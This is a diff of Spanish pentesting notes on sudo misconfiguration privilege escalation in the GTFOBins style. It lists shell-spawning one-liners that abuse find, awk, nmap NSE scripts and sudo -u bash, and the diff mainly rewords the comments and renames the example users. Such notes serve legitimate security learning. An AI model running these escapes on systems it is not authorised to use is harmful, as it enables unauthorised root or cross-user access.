@@ -19,24 +19,31 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 ## Sudoers 
 
 ```bash
-❯ sudo -l                                          # Ver que permisos tenemos en el sudoer y poder ejecutar como root algun comando
+❯ sudo -l    # Ejecutar el comando 'find' sin password
 	
 	# (ALL : ALL) ALL
 	# ALL=(root) NOPASSWD: /usr/bin/find
 	
-	# El comando que podemos ejecutar lo debemos de hacer asi:
+	# Ejecutar el comando de la siguiente manera:
 ❯ sudo find . -exec /bin/sh \; -quit
 ❯ sudo awk 'BEGIN {system("/bin/sh")}' 
 ```
 
-También puede que nos salga en el Sudoers la siguiente información.
-
 ```bash
-❯ sudo -l                                                    # Si encontramos esto, es que podemos ejecutar como nuestro usuario el comando 'nmap' siendo 'villa' sin passwd
+❯ sudo -l      # Ejecutar el comando 'nmap' siendo 'user2' sin passwd
 	
-	#  (villa) NOPASSWD: /usr/bin/nmap 
+	#  (user2) NOPASSWD: /usr/bin/nmap 
 
-	# El comando que podemos ejecutar lo debemos de hacer asi:
-❯ echo 'os.execute("/bin/sh")' > script.nse                  # Este comando lo podemos ejecutar en un dir con capacidad de escritura, el .nse es porque es un script en LUA y ese tipo de archivos los lee nmap
-❯ sudo -u villa nmap --script=/tmp/script.nse
+	# Ejecutar el comando de la siguiente manera:
+❯ echo 'os.execute("/bin/sh")' > script.nse     # Ejecutar el comando en el dir '/tmp/'
+❯ sudo -u user2 nmap --script=/tmp/script.nse
+```
+
+```bash 
+❯ sudo -l       # Cambiar de usuario sin password 
+
+	#  (user1 : user2) NOPASSWD: /bin/bash 
+
+	# Ejecutar el comando de la siguiente manera:
+❯ sudo -u user2 /bin/bash     
 ```
